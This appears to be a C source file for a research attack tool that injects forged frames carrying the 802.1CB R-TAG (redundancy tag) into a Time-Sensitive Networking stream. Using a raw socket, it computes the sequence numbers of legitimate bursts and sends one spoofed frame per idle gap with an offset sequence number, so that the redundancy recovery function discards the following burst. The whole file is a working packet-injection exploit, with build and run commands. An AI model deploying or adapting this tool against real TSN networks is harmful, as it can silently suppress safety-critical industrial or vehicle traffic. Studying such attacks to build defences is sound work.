/* tsn_inject_rsd.c — burst-aware RSD injector
 *
 * Different to the CR injector, the sequence number cannot be extrapolated
 * with the continuous frame rate here. During the idle gap, the legitimate
 * sequence number stays at the last frame of the previous burst.
 *
 * Therefore, the burst containing the calibration frame is used as reference.
 * For each following burst, the last legitimate sequence number is calculated:
 *
 *   b_cap        = app_cap / bsize
 *   S_last(b)    = rtag_cap + (b*bsize + bsize-1 - app_cap)
 *   S_atk(b)     = S_last(b) + delta
 *   t_inj(b)     = burst_start(b) + reset_off
 *
 * The injection is sent during the idle gap after a burst.
 * One frame is sent per gap. The attacker does not interfere with
 * the legitimate forwarding path.
 *
 * Build:
 *   gcc -O2 -o tsn_inject_rsd tsn_inject_rsd.c
 *
 * Run:
 *   sudo ./tsn_inject_rsd <if> <rtag_cap> <t_cap_ns> <app_cap> <delta> <bsize> \
 *       <period_ns> <reset_off_ns> <n_gaps> <app_base_hex> <guard_ns>
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>


#define RTAG_ETHERTYPE 0xF1C1
#define INNER_ETHERTYPE 0x0800
#define MAGIC 0x46524552u

static const uint8_t DST_MAC[6] =
    {0x70, 0xf8, 0xe7, 0xd0, 0x13, 0x8b};

static const char *SRC_IP = "10.0.1.99";
static const char *DST_IP = "10.0.1.150";

static const uint16_t UDP_DPORT = 9999;
static const int PAD = 24;


/* IP checksum */
static uint16_t ipcsum(const void *data, int len)
{
    const uint16_t *p = data;
    uint32_t s = 0;

    while (len > 1) {
        s += *p++;
        len -= 2;
    }

    if (len)
        s += *(const uint8_t *)p;

    while (s >> 16)
        s = (s & 0xffff) + (s >> 16);

    return (uint16_t)~s;
}


/* current time for packet scheduling */
static unsigned long long now_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_REALTIME, &t);

    return (unsigned long long)t.tv_sec * 1000000000ull
         + t.tv_nsec;
}


int main(int argc, char **argv)
{
    if (argc < 12) {
        fprintf(stderr,
            "usage: %s <if> <rtag_cap> <t_cap_ns> <app_cap> <delta> "
            "<bsize> <period_ns> <reset_off_ns> <n_gaps> "
            "<app_base_hex> <guard_ns>\n",
            argv[0]);

        return 1;
    }


    const char *iface = argv[1];

    long rtag_cap = strtol(argv[2], NULL, 0);
    unsigned long long t_cap = strtoull(argv[3], NULL, 0);

    long app_cap = strtol(argv[4], NULL, 0);
    long delta = strtol(argv[5], NULL, 0);

    long bsize = strtol(argv[6], NULL, 0);

    unsigned long long period =
        strtoull(argv[7], NULL, 0);

    unsigned long long reset_off =
        strtoull(argv[8], NULL, 0);

    long n_gaps = strtol(argv[9], NULL, 0);

    uint32_t app_base =
        (uint32_t)strtoul(argv[10], NULL, 0);

    unsigned long long guard =
        strtoull(argv[11], NULL, 0);


    /* burst which contains the calibration frame */
    long b_cap = app_cap / bsize;


    /*
     * Raw Ethernet socket.
     * The attacker only sends frames and does not modify
     * the legitimate traffic.
     */
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (fd < 0) {
        perror("socket(AF_PACKET) — need root");
        return 1;
    }


    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);

    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX");
        return 1;
    }

    int ifindex = ifr.ifr_ifindex;


    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("SIOCGIFHWADDR");
        return 1;
    }

    uint8_t src_mac[6];
    memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6);


    /*
     * Build the frame once.
     * Only the R-TAG sequence number and the application
     * sequence number are changed for each injection.
     */
    uint8_t buf[512];
    int o = 0;


    /* Ethernet header */
    memcpy(buf + o, DST_MAC, 6);
    o += 6;

    memcpy(buf + o, src_mac, 6);
    o += 6;


    /* R-TAG */
    buf[o++] = (RTAG_ETHERTYPE >> 8) & 0xff;
    buf[o++] = RTAG_ETHERTYPE & 0xff;

    buf[o++] = 0x00;
    buf[o++] = 0x00;                 /* reserved */

    int seq_off = o;

    buf[o++] = 0x00;
    buf[o++] = 0x00;                 /* sequence number, set later */


    /* inner Ethernet type */
    buf[o++] = (INNER_ETHERTYPE >> 8) & 0xff;
    buf[o++] = INNER_ETHERTYPE & 0xff;


    /* IP header */
    int payload_len = 4 + 4 + PAD;
    int udp_len = 8 + payload_len;
    int ip_len = 20 + udp_len;

    uint8_t *ip = buf + o;

    memset(ip, 0, 20);

    ip[0] = 0x45;

    ip[2] = (ip_len >> 8) & 0xff;
    ip[3] = ip_len & 0xff;

    ip[5] = 0x01;

    ip[8] = 64;
    ip[9] = 17;                      /* UDP */

    inet_pton(AF_INET, SRC_IP, ip + 12);
    inet_pton(AF_INET, DST_IP, ip + 16);

    uint16_t c = ipcsum(ip, 20);

    ip[10] = c & 0xff;
    ip[11] = (c >> 8) & 0xff;

    o += 20;


    /* UDP header */
    uint8_t *udp = buf + o;

    udp[0] = 0;
    udp[1] = 0;

    udp[2] = (UDP_DPORT >> 8) & 0xff;
    udp[3] = UDP_DPORT & 0xff;

    udp[4] = (udp_len >> 8) & 0xff;
    udp[5] = udp_len & 0xff;

    udp[6] = 0;
    udp[7] = 0;

    o += 8;


    /*
     * Application payload:
     * magic + application sequence + padding.
     * The application sequence is only used to identify
     * injected frames at the observation point.
     */
    *(uint32_t *)(buf + o) = htonl(MAGIC);
    o += 4;

    int appseq_off = o;

    *(uint32_t *)(buf + o) = htonl(app_base);
    o += 4;

    memset(buf + o, 0xA5, PAD);
    o += PAD;


    /* destination for sendto() */
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof sa);

    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;

    memcpy(sa.sll_addr, DST_MAC, 6);


    /*
     * Find the first gap which is still in the future.
     * The guard time prevents the first injection from being scheduled
     * too close to the current time.
     */
    unsigned long long now = now_ns();

    long b0 = b_cap + 1;

    while (
        (long long)(
            t_cap
            + (unsigned long long)(b0 - b_cap) * period
            + reset_off
        )
        <
        (long long)(now + guard)
    ) {
        b0++;
    }


    printf(
        "[rsd] START "
        "b_cap=%ld "
        "b0=%ld "
        "delta=%ld "
        "bsize=%ld "
        "period_ns=%llu "
        "reset_off_ns=%llu "
        "n_gaps=%ld "
        "app_base=0x%08x\n",
        b_cap,
        b0,
        delta,
        bsize,
        period,
        reset_off,
        n_gaps,
        app_base
    );


    for (long i = 0; i < n_gaps; i++) {

        long b = b0 + i;


        /* injection is placed in the idle gap after burst b */
        unsigned long long tinj =
            t_cap
            + (unsigned long long)(b - b_cap) * period
            + reset_off;


        struct timespec w = {
            .tv_sec = tinj / 1000000000ull,
            .tv_nsec = tinj % 1000000000ull
        };


        clock_nanosleep(
            CLOCK_REALTIME,
            TIMER_ABSTIME,
            &w,
            NULL
        );


        /*
         * Calculate the last legitimate frame of this burst
         * and add the attacker-controlled sequence offset.
         */
        long s_last =
            rtag_cap
            + (b * bsize + bsize - 1 - app_cap);

        long s_atk =
            ((s_last + delta) % 65536 + 65536) % 65536;


        /* application sequence for identifying the injection */
        uint32_t app_seq =
            app_base + (uint32_t)i;


        /* set R-TAG sequence number */
        buf[seq_off] =
            (s_atk >> 8) & 0xff;

        buf[seq_off + 1] =
            s_atk & 0xff;


        /* set application sequence number */
        *(uint32_t *)(buf + appseq_off) =
            htonl(app_seq);


        unsigned long long tsend = now_ns();


        if (sendto(
                fd,
                buf,
                o,
                0,
                (struct sockaddr *)&sa,
                sizeof sa
            ) < 0) {

            perror("sendto");
            return 1;
        }


        /*
         * The next burst is the burst which can be suppressed
         * after the recovery state was re-anchored.
         */
        printf(
            "RSD SENT "
            "i=%ld "
            "gap_after_burst=%ld "
            "suppress_burst=%ld "
            "t_send_ns=%llu "
            "s_last_legit=%ld "
            "delta=%ld "
            "s_atk=%ld "
            "app_seq=0x%08x "
            "legit_app_lo=%ld "
            "legit_app_hi=%ld\n",
            i,
            b,
            b + 1,
            tsend,
            ((s_last % 65536) + 65536) % 65536,
            delta,
            s_atk,
            app_seq,
            (b + 1) * bsize,
            (b + 1) * bsize + bsize - 1
        );

        fflush(stdout);
    }


    printf(
        "[rsd] END sent=%ld\n",
        n_gaps
    );


    return 0;
}